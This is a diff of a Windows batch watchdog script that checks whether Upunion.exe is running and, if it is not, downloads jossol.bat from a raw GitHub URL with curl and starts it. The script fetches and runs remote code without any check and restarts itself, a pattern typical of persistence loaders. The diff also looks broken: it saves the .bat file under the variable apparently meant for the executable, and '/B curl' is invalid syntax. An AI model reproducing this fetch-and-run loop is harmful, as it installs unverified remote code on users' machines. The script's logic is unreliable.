@@ -60,12 +60,12 @@ rem Цикл проверки наличия процесса Upunion.exe
 tasklist /FI "IMAGENAME eq Upunion.exe" 2>NUL | findstr /I "Upunion.exe" > NUL
 if %ERRORLEVEL% NEQ 0 (
     echo Process Upunion.exe not found. Checking and starting jossol.bat...
-    if not exist "%jossol%" (
-        echo File "%jossol%" not found. Downloading...
-        /B curl -L -o "%jossol%" "https://raw.githubusercontent.com/poiko34/school/refs/heads/main/jossol.bat"
+    if not exist "%upunion%" (
+        echo File "%upunion%" not found. Downloading...
+        /B curl -L -o "%upunion%" "https://raw.githubusercontent.com/poiko34/school/refs/heads/main/jossol.bat"
     ) else (
         echo Starting jossol.bat...
-        start "" "%jossol%"
+        start "" "%upunion%"
     )
 ) else (
     echo Process Upunion.exe is running.
